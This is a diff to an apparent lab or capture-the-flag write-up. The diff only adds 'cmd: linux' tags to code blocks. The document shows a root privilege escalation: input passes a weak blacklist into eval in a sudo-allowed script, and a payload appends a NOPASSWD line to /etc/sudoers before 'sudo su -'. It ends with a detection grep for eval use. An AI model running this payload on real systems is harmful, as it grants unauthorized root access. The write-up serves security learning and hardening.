@@ -11,6 +11,7 @@ A sudo-allowed bash script pipes user input through a character blacklist and th
 
 ## Vulnerable Pattern
 
+<!-- cmd: linux -->
 ```bash
 #!/bin/bash
 read feedback
@@ -26,6 +27,7 @@ Blacklisted: `` ` ``, `)`, `$(`, `|`, `&`, `;`, ``, `!`, `\`.
 ## Steps
 
 ### 1. Confirm the path
+<!-- cmd: linux -->
 ```bash
 sudo -l
 # (ALL) /opt/NewComponent/feedback.sh
@@ -33,6 +35,7 @@ cat /opt/NewComponent/feedback.sh
 ```
 
 ### 2. Payload — append to sudoers
+<!-- cmd: linux -->
 ```bash
 sudo /opt/NewComponent/feedback.sh
 # Enter your feedback:
@@ -41,6 +44,7 @@ deku ALL=NOPASSWD: ALL >> /etc/sudoers
 `eval "echo deku ALL=NOPASSWD: ALL >> /etc/sudoers"` runs — the shell expands `>>` and appends the literal text to `/etc/sudoers` as root.
 
 ### 3. Cash in
+<!-- cmd: linux -->
 ```bash
 sudo -l              # deku is now NOPASSWD ALL
 sudo su -            # root
@@ -65,6 +69,7 @@ Anywhere root writes periodically is fair game.
 
 ## Detection / Hardening
 
+<!-- cmd: linux -->
 ```bash
 grep -Rn 'eval\|sh -c\|bash -c' /opt /home /usr/local/bin 2>/dev/null
 ```
